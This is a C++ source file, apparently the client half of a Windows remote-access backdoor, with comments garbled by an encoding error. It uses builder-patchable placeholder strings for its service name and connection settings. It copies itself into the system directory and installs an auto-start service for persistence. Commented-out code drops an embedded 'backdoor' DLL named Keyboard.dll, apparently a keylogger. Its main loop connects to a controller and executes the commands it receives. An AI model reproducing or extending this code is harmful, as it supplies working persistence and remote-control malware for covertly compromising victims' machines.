// Client.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include "Common.h"
#include "ThreadMain.h"

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"User32.lib")
#pragma comment(lib,"Advapi32.lib")

//#pragma comment( linker, "/subsystem:windows /entry:wmainCRTStartup" )
#define EXE_NAME _T("Client.exe")

void Client();
DWORD WINAPI RunService(LPVOID lparam);

char ServiceName[220] =
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

char ShowName[220] = 
"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";

char Description[220] = 
"CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC";

wchar_t Auto[] = L"AutorunFlag";

char info[220] = "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU";

SERVICE_STATUS        ServiceStatus;
SERVICE_STATUS_HANDLE ServiceStatusHandle;

/*
������DWORD
����ֵ��void
���ܣ�����״̬����
*/
void WINAPI ServiceControl(DWORD dwCode)
{
	switch (dwCode)
	{
		//������ͣ
	case SERVICE_CONTROL_PAUSE:
		ServiceStatus.dwCurrentState = SERVICE_PAUSED;
		break;
		//�������
	case SERVICE_CONTROL_CONTINUE:
		ServiceStatus.dwCurrentState = SERVICE_RUNNING;
		break;
		//����ֹͣ
	case SERVICE_CONTROL_STOP:
		ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		ServiceStatus.dwWin32ExitCode = 0;
		ServiceStatus.dwCheckPoint = 0;
		ServiceStatus.dwWaitHint = 0;
		//���÷���״̬
		if (SetServiceStatus(ServiceStatusHandle, &ServiceStatus) == 0)
		{
			printf("SetServiceStatus in ServiceControl in Switch Error !\n");
		}
		return;
	case SERVICE_CONTROL_INTERROGATE:
		break;
	case SERVICE_CONTROL_SHUTDOWN:
		ServiceStatus.dwWin32ExitCode = 0;
		ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		break;
	default:
		break;
	}
	//���÷���״̬
	if (SetServiceStatus(ServiceStatusHandle, &ServiceStatus) == 0)
	{
		printf("SetServiceStatus in ServiceControl out Switch Error !\n");
	}
	return;
}
/*
������DWORD dwArgc, LPTSTR *lpArgv
����ֵ��void
���ܣ�������ں���
*/
void WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpArgv)
{
	//��дSERVICE_STATUS �ṹ
	ServiceStatus.dwServiceType = SERVICE_WIN32;
	ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
	ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN
		| SERVICE_ACCEPT_PAUSE_CONTINUE;
	ServiceStatus.dwServiceSpecificExitCode = 0;
	ServiceStatus.dwWin32ExitCode = 0;
	ServiceStatus.dwCheckPoint = 0;
	ServiceStatus.dwWaitHint = 0;
	//ע�������ƺ���
	ServiceStatusHandle = RegisterServiceCtrlHandlerW((wchar_t*)ServiceName, ServiceControl); //������
	if (ServiceStatusHandle == 0)
	{
		printf("RegisterServiceCtrlHandler Error !\n");
		return;
	}
	ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	ServiceStatus.dwCheckPoint = 0;
	ServiceStatus.dwWaitHint = 0;
	//���÷���״̬
	if (SetServiceStatus(ServiceStatusHandle, &ServiceStatus) == 0)
	{
		printf("SetServiceStatus Error !\n");
		return;
	}
	//���������߳�
	::CloseHandle(CreateThread(NULL, 0, RunService, NULL, 0, NULL));
	return;
}

/*
���ܣ����з���
*/
DWORD WINAPI RunService(LPVOID lparam)
{
	Client();
	return 0;
}

/*
���ܣ���װ����
*/
int APIENTRY InstallService()
{
	SC_HANDLE        schSCManager;
	SC_HANDLE        schService;
	DWORD            dwErrorCode;
	SERVICE_STATUS   InstallServiceStatus;
	SERVICE_DESCRIPTION description;
	description.lpDescription = (wchar_t*)Description; //����������Ϣ
	wchar_t SysPath[260];
	wchar_t SelfFile[260];
	GetSystemDirectory(SysPath, sizeof(SysPath));
	wcscat_s(SysPath, _T("\\")); //�������
	wcscat_s(SysPath, EXE_NAME);
	GetModuleFileNameW(NULL, SelfFile, MAX_PATH);
	//��������ϵͳĿ¼
	CopyFileW(SelfFile, SysPath, false);
	//�򿪷�����ƹ��������ݿ�
	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (schSCManager == NULL)
	{
		printf("OpenSCManager Error !\n");
		return 0;
	}
	//��������
	/*
	schService=CreateServiceW(schSCManager,(wchar_t*)ServiceName,(wchar_t*)ShowName,SERVICE_ALL_ACCESS, //����������ʾ��
	SERVICE_WIN32_OWN_PROCESS,SERVICE_AUTO_START,
	SERVICE_ERROR_IGNORE,SysPath,NULL,NULL,NULL,NULL,NULL);
	*/
	schService = CreateServiceW(
		schSCManager,
		(wchar_t*)ServiceName,  //������
		(wchar_t*)ShowName,     //��ʾ��
		SERVICE_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
		SERVICE_AUTO_START,
		SERVICE_ERROR_IGNORE,
		SysPath,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL
		);
	//����ʧ��
	if (schService == NULL)
	{
		dwErrorCode = GetLastError();
		if (dwErrorCode != ERROR_SERVICE_EXISTS)
		{
			printf("CreateService Error !\n");
			CloseServiceHandle(schSCManager);
			return 0;
		}
		//����������
		else
		{
			//��������Ѵ�����򿪷���
			schService = OpenService(schSCManager, (wchar_t*)ServiceName, SERVICE_START); //������
			//��ʧ��
			if (schService == NULL)
			{
				printf("OpenService Error !\n");
				CloseServiceHandle(schSCManager);
				return 0;
			}
		}
	}
	else if (description.lpDescription != NULL)
	{
		ChangeServiceConfig2(schService, SERVICE_CONFIG_DESCRIPTION, &description);
	}

	//��������
	if (StartService(schService, 0, NULL) == 0)
	{
		dwErrorCode = GetLastError();
		//������������
		if (dwErrorCode == ERROR_SERVICE_ALREADY_RUNNING)
		{
			printf("StartService Error !\n");
			CloseServiceHandle(schSCManager);
			CloseServiceHandle(schService);
			return 0;
		}
	}
	//��ѯ����״̬
	while (QueryServiceStatus(schService, &InstallServiceStatus) != 0)
	{   //�����Ƿ��ڳ�ʼ���׶�
		if (InstallServiceStatus.dwCurrentState == SERVICE_START_PENDING)
		{
			Sleep(100);
		}
		else
		{
			break;
		}
	}
	//��ѯ����״̬������û�������ɹ�
	if (InstallServiceStatus.dwCurrentState != SERVICE_RUNNING)
	{
		printf("Install service Failed\n");
	}
	else
	{
		printf("Install service Successed\n");
	}
	CloseServiceHandle(schSCManager);
	CloseServiceHandle(schService);
	return 1;
}


int _tmain(int argc, _TCHAR* argv[])
{
	/*
	SERVICE_TABLE_ENTRY DispatchTable[] =
	{
		//�����������ƺ���ڵ�
		{ (wchar_t*)ServiceName, ServiceMain }, //������
		//SERVICE_TABLE_ENTRY�ṹ�����ԡ�NULL������
		{ NULL, NULL }
	};
	//���ӷ�����ƹ���������ʼ���Ƶ��ȳ����߳�
	StartServiceCtrlDispatcherW(DispatchTable);

	
	//�ͷ�Dll
	wchar_t DllPath[256];
	GetSystemDirectoryW(DllPath, sizeof(DllPath));
	//�õ�DLL��·���ļ���
	wcscat_s(DllPath, _T("\\Keyboard.dll"));
	//����Դ������ΪDLL�ļ�
	ResourceToFile(DllPath, MAKEINTRESOURCEW(ID_BACKDOOR_DLL), MAKEINTRESOURCEW(RC_DLL));


	InstallService();
	*/
	Client();
	return 0;
}

void Client()
{
	if (!strcmp("UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU", info))
	{
		printf("��δ���ó���\n");
		return;
	}
	CThreadMain Thread_Main;
	Thread_Main.RunFlag = true;
	Thread_Main.GetInfo(info); //��ȡ������Ϣ
	/*
	if (Auto[1] == '1')
	{
		wcscpy_s(Thread_Main.MyServiceName, (wchar_t*)ServiceName);
	}
	*/
	while (true)
	{
		if (Thread_Main.RunFlag == false)
		{
			break;
		}
		SOCKET sock;
		sock = Thread_Main.Run();
		Thread_Main.Command(sock);
	}
}


